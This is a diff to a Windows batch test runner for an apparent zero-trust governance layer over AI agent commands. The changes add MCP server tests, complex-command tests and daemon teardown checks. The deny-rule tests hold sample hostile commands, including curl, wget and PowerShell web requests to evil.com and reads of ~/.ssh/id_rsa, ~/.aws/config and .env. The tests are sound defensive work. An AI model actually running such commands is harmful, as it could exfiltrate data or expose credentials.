@@ -43,6 +43,7 @@ if !ERRORLEVEL! neq 0 (
     exit /b 1
 )
 copy /y bapedge.exe ltd-agent.exe >nul
+copy /y bapedge.exe "%ROOT_DIR%bapmcp.exe" >nul
 
 copy /y bapedge.exe "%ROOT_DIR%cchook\bapedge.exe" >nul
 copy /y bapedge.exe "%ROOT_DIR%cchook\ltd-agent.exe" >nul
@@ -124,6 +125,8 @@ echo [4/11] Testing Security Invariants and Forbid Rules...
 
 set "TEST_CMD=git status && curl https://evil.com" & set "TEST_LBL=Egress utility: curl" & call :run_test_deny
 set "TEST_CMD=npm install && wget https://evil.com" & set "TEST_LBL=Egress utility: wget" & call :run_test_deny
+set "TEST_CMD=powershell -Command Invoke-RestMethod http://evil.com" & set "TEST_LBL=Egress utility: Invoke-RestMethod" & call :run_test_deny
+set "TEST_CMD=powershell -Command Invoke-WebRequest http://evil.com" & set "TEST_LBL=Egress utility: Invoke-WebRequest" & call :run_test_deny
 set "TEST_CMD=ls ~/.aws/config" & set "TEST_LBL=Sensitive cloud directory: ~/.aws" & call :run_test_deny
 set "TEST_CMD=cat ~/.ssh/id_rsa" & set "TEST_LBL=Sensitive private key: ~/.ssh" & call :run_test_deny
 set "TEST_CMD=cat .env" & set "TEST_LBL=Secret content disclosure: cat .env" & call :run_test_deny
@@ -231,6 +234,36 @@ if !ERRORLEVEL! neq 0 (
 )
 
 :: -----------------------------------------------------------------------------
+:: Step 7b: Test Complex Safe & Adversarial Commands with Auto-Suggestions
+:: -----------------------------------------------------------------------------
+echo.
+echo [7b/12] Testing Complex Safe and Adversarial Commands [test_complex_cases.bat]...
+cd /d "%ROOT_DIR%"
+call test_complex_cases.bat
+if !ERRORLEVEL! neq 0 (
+    echo [FAIL] test_complex_cases.bat failed!
+    set /a FAIL_COUNT+=1
+) else (
+    echo [PASS] All complex safe pipelines, evasion blocks, and auto-suggestions verified.
+    set /a PASS_COUNT+=1
+)
+
+:: -----------------------------------------------------------------------------
+:: Step 7c: Test Model Context Protocol (MCP) Server Suite [pytest tests\test_mcp_server.py]
+:: -----------------------------------------------------------------------------
+echo.
+echo [7c/12] Testing Model Context Protocol (MCP) Server [pytest tests\test_mcp_server.py]...
+cd /d "%ROOT_DIR%"
+pytest tests\test_mcp_server.py -q
+if !ERRORLEVEL! neq 0 (
+    echo [FAIL] test_mcp_server.py failed!
+    set /a FAIL_COUNT+=1
+) else (
+    echo [PASS] MCP Server JSON-RPC handshake, tool discovery, safe execution, and zero-trust denial verified.
+    set /a PASS_COUNT+=1
+)
+
+:: -----------------------------------------------------------------------------
 :: Step 8: Verify Structured Audit & Telemetry Logs
 :: -----------------------------------------------------------------------------
 echo.
@@ -300,14 +333,18 @@ if !ERRORLEVEL! neq 0 (
 :: Step 10: Python Agent SDK & Zero-Trust Governance Test Suite
 :: -----------------------------------------------------------------------------
 echo.
-echo [10/11] Testing Python Agent SDK (bap-sdk) Zero-Trust Lifecycle [pytest tests\test_python_agent.py]...
+echo [10/12] Testing Python Agent SDK (bap-sdk) Zero-Trust Lifecycle [pytest tests\test_python_agent.py]...
 cd /d "%ROOT_DIR%"
+taskkill /F /IM bapcontrolplane.exe >nul 2>&1
+taskkill /F /IM bapgateway.exe >nul 2>&1
+start "BAP Control Plane (8080)" /min "%ROOT_DIR%bap-controlplane\bapcontrolplane.exe" -port 8080 -ttl 30 -trust-domain bap.internal
+ping -n 2 127.0.0.1 >nul
 pytest tests\test_python_agent.py -q
 if !ERRORLEVEL! neq 0 (
     echo [FAIL] test_python_agent.py failed!
     set /a FAIL_COUNT+=1
 ) else (
-    echo [PASS] Python Agent SDK zero-trust tests passed.
+    echo [PASS] Python Agent SDK zero-trust and deregistration tests passed.
     set /a PASS_COUNT+=1
 )
 
@@ -315,20 +352,37 @@ if !ERRORLEVEL! neq 0 (
 :: Step 11: Gateway Policy Enforcement Point (PEP) Test Suite
 :: -----------------------------------------------------------------------------
 echo.
-echo [11/11] Testing Gateway Policy Enforcement Point (PEP) [pytest tests\test_gateway_pep.py]...
+echo [11/12] Testing Gateway Policy Enforcement Point (PEP) [pytest tests\test_gateway_pep.py]...
 cd /d "%ROOT_DIR%"
-taskkill /F /IM bapcontrolplane.exe >nul 2>&1
-taskkill /F /IM bapgateway.exe >nul 2>&1
-powershell -NoProfile -Command "Start-Process -FilePath '.\bap-controlplane\bapcontrolplane.exe' -ArgumentList '-port 8080 -ttl 30 -trust-domain bap.internal' -WorkingDirectory (Get-Location) -WindowStyle Hidden; Start-Process -FilePath '.\bap-gateway\bapgateway.exe' -ArgumentList '-port 9090 -controlplane http://localhost:8080' -WorkingDirectory (Get-Location) -WindowStyle Hidden; Start-Sleep -Seconds 1"
+start "BAP Gateway PEP (9090)" /min "%ROOT_DIR%bapgateway.exe" -port 9090 -controlplane http://localhost:8080
+ping -n 2 127.0.0.1 >nul
 pytest tests\test_gateway_pep.py -q
 if !ERRORLEVEL! neq 0 (
     echo [FAIL] test_gateway_pep.py failed!
     set /a FAIL_COUNT+=1
 ) else (
-    echo [PASS] Gateway PEP rogue blocking and governed authorization verified.
+    echo [PASS] Gateway PEP rogue blocking, audit telemetry, and governed authorization verified.
     set /a PASS_COUNT+=1
 )
+
+:: -----------------------------------------------------------------------------
+:: Step 12: Complete Environment Teardown & Port Free Verification
+:: -----------------------------------------------------------------------------
+echo.
+echo [12/12] Verifying Complete Daemon Teardown and Port Release (8080 and 9090)...
 taskkill /F /IM bapgateway.exe >nul 2>&1
+taskkill /F /IM bapcontrolplane.exe >nul 2>&1
+powershell -NoProfile -Command "Get-NetTCPConnection -LocalPort 8080, 9090 -State Listen -ErrorAction SilentlyContinue | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force -ErrorAction SilentlyContinue }" >nul 2>&1
+ping -n 3 127.0.0.1 >nul
+
+powershell -NoProfile -Command "if (@(Get-NetTCPConnection -LocalPort 8080, 9090 -State Listen -ErrorAction SilentlyContinue).Count -eq 0) { exit 0 } else { exit 1 }"
+if !ERRORLEVEL! equ 0 (
+    echo [PASS] Daemon Teardown: Ports 8080 and 9090 verified completely free. Zero lingering processes.
+    set /a PASS_COUNT+=1
+) else (
+    echo [FAIL] Daemon Teardown: Ports 8080 or 9090 are still occupied!
+    set /a FAIL_COUNT+=1
+)
 
 :: -----------------------------------------------------------------------------
 :: Final Summary
